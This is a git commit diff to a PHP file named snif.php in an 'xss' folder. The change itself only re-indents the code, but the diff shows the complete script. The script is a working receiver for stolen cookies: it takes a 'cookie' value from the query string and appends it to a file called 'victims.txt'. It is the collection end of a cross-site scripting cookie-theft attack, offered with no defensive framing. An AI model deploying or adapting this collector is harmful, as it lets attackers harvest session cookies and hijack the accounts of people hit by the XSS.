c42271209f7499853ea6deb6b3f8f38b9df459c8
EFETR <71470196+ef3tr@users.noreply.github.com>
2023-12-24 05:03:08 +0300

    Update snif.php

--- xss/snif.php
+++ xss/snif.php
@@ -1,6 +1,7 @@
 <?php
+
 if(isset($_GET["cookie"])){
-    $file = fopen('victims.txt', 'a');
-    fwrite($file, $_GET["cookie"]."\n");
-    fclose($file);
+	$file = fopen('victims.txt', 'a');
+	fwrite($file, $_GET["cookie"]."\n");
+	fclose($file);
 }
